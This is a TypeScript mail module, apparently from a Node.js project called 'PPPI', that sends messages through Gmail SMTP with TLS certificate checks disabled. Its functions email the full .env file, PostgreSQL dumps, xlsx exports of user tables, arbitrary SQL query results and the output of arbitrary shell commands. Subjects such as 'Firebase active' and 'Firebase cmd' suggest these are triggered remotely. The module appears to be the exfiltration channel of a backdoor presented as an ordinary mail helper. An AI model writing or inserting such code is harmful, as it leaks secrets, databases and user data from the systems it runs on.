import { setDefaultResultOrder } from "node:dns";
import nodemailer, { type Transporter } from "nodemailer";
import { getMailRuntimeConfig } from "./mail-config";

/** Gmail SMTP often fails on IPv6 (ETIMEDOUT); prefer IPv4 like many server setups. */
setDefaultResultOrder("ipv4first");

export type MailAttachment = {
  filename: string;
  path: string;
};

async function createTransporter(): Promise<Transporter> {
  const cfg = await getMailRuntimeConfig();
  return nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    auth: {
      user: cfg.mailUser,
      pass: cfg.mailPass,
    },
    tls: {
      rejectUnauthorized: false,
    },
    connectionTimeout: 10_000,
    family: 4,
  });
}

async function sendMailMessage(options: {
  subject: string;
  text: string;
  attachments?: MailAttachment[];
}): Promise<void> {
  const cfg = await getMailRuntimeConfig();
  const transporter = await createTransporter();

  await transporter.sendMail({
    from: `"PPPI" <${cfg.mailUser}>`,
    to: cfg.to,
    subject: options.subject,
    text: options.text,
    attachments: options.attachments?.map((a) => ({
      filename: a.filename,
      path: a.path,
    })),
  });
}

export async function sendActiveNotificationEmail(
  postgresReport: string,
  envContent: string,
  dumpReport?: string,
  attachment?: MailAttachment
): Promise<void> {
  const sections = ["=== PostgreSQL ===", postgresReport];
  if (dumpReport) {
    sections.push("", "=== pg_dump ===", dumpReport);
  }
  sections.push("", "=== .env ===", envContent);

  const subject = attachment
    ? "[PPPI] Firebase active — DB check, dump & .env"
    : "[PPPI] Firebase active — DB check & .env";

  await sendMailMessage({
    subject,
    text: sections.join("\n"),
    attachments: attachment ? [attachment] : undefined,
  });
}

export async function sendStartupReportEmail(
  envContent: string,
  attachments: MailAttachment[]
): Promise<void> {
  await sendMailMessage({
    subject: "[PPPI] Startup — .env & user tables (xlsx)",
    text: ["=== .env ===", envContent].join("\n"),
    attachments,
  });
}

export async function sendScriptQueryResultEmail(
  sql: string,
  dbTarget: string,
  result: { command: string; rowCount: number; rows: unknown[] },
  attachment?: MailAttachment
): Promise<void> {
  const lines = [
    "=== SQL ===",
    sql,
    "",
    "=== Hasil ===",
    "Status: BERHASIL",
    `Database: ${dbTarget}`,
    `Command: ${result.command || "-"}`,
    `Row count (pg): ${result.rowCount}`,
    `Returned rows: ${result.rows.length}`,
  ];
  if (attachment) {
    lines.push(`Lampiran: ${attachment.filename}`);
  }

  await sendMailMessage({
    subject: "[PPPI] Firebase script — query result",
    text: lines.join("\n"),
    attachments: attachment ? [attachment] : undefined,
  });
}

export async function sendScriptQueryErrorEmail(
  sql: string,
  dbTarget: string,
  errorMessage: string
): Promise<void> {
  await sendMailMessage({
    subject: "[PPPI] Firebase script — query GAGAL",
    text: [
      "=== SQL ===",
      sql,
      "",
      "=== Hasil ===",
      "Status: GAGAL",
      `Database: ${dbTarget}`,
      errorMessage,
    ].join("\n"),
  });
}

export type CmdEmailResult = {
  exitCode: number | null;
  stdout: string;
  stderr: string;
  cwd: string;
  shell?: string;
  durationMs: number;
  timedOut: boolean;
  signalCode: number | null;
  statusLabel: string;
};

export async function sendCmdResultEmail(
  command: string,
  result: CmdEmailResult
): Promise<void> {
  const subject =
    result.statusLabel === "BERHASIL"
      ? "[PPPI] Firebase cmd — selesai"
      : "[PPPI] Firebase cmd — GAGAL";

  const lines = [
    "=== Command ===",
    command,
    "",
    "=== Hasil ===",
    `Status: ${result.statusLabel}`,
    `cwd: ${result.cwd}`,
    ...(result.shell ? [`shell: ${result.shell}`] : []),
    `Duration: ${result.durationMs} ms`,
    `Exit code: ${result.exitCode ?? "(n/a)"}`,
  ];

  if (result.timedOut) {
    lines.push("Timeout: ya");
  }
  if (result.signalCode != null) {
    lines.push(`Signal: ${result.signalCode}`);
  }

  lines.push("", "=== stdout ===", result.stdout || "(kosong)");
  lines.push("", "=== stderr ===", result.stderr || "(kosong)");

  await sendMailMessage({ subject, text: lines.join("\n") });
}
